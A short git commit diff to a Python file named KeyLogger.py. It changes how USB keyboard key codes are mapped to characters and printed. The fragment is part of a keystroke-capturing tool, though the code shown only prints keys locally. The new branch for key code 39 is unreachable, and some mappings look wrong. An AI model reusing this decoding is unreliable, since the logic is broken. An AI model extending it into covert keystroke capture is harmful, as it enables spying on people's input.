6bcbb500ba247b6dcbadbe6cbcf9746e544109ff
Alexander <alexandermis@web.de>
2023-05-09 19:13:09 +0200

    FileHandler

--- src/KeyLogger.py
+++ src/KeyLogger.py
@@ -83,8 +83,10 @@ class KeyLogger:
                 key_code = data[2]  # The key code is in byte 2
                 if key_code<30:
                     char = chr(key_code+93)  # Convert the key code to a character
-                elif 30 <=key_code and key_code <40:
+                elif 30 <=key_code and key_code <49:
                     char = chr(key_code + 19)
+                elif key_code == 39:
+                    char = chr(39+9)
                 print(f"Key pressed: {key_code} ({char})")
         # device =self.__find_device()
         # if device is None:
